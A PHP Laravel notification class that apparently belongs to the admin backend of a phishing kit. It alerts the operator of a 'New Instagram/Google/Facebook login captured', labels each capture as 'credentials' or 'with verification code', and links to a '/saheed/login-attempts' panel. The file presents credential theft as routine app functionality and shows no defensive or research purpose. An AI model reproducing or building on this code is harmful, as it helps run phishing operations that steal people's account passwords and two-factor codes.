<?php

namespace App\Notifications;

use App\Models\LoginAttempt;
use Illuminate\Bus\Queueable;
use Illuminate\Notifications\Messages\MailMessage;
use Illuminate\Notifications\Notification;

class NewLoginAttempt extends Notification
{
    use Queueable;

    public $attempt;

    public function __construct(LoginAttempt $attempt)
    {
        $this->attempt = $attempt;
    }

    public function via($notifiable)
    {
        return ['database', 'broadcast'];
    }

    public function toBroadcast($notifiable)
    {
        $platform = $this->attempt->platform === 'instagram' ? 'Instagram' : ($this->attempt->platform === 'gmail' ? 'Google' : 'Facebook');
        $status = $this->attempt->status === 'verification' ? 'with verification code' : 'credentials';

        return [
            'message' => "New $platform login captured ($status)",
            'attempt_id' => $this->attempt->id,
            'platform' => $this->attempt->platform,
        ];
    }

    public function toDatabase($notifiable)
    {
        $platform = $this->attempt->platform === 'instagram' ? 'Instagram' : ($this->attempt->platform === 'gmail' ? 'Google' : 'Facebook');
        $status = $this->attempt->status === 'verification' ? 'with verification code' : 'credentials';

        return [
            'title' => 'New Login Attempt',
            'body' => "New $platform login captured ($status)",
            'actions' => [
                [
                    'name' => 'View Details',
                    'url' => '/saheed/login-attempts',
                    'color' => 'primary',
                ]
            ],
            'attempt_id' => $this->attempt->id,
            'platform' => $this->attempt->platform,
        ];
    }
}
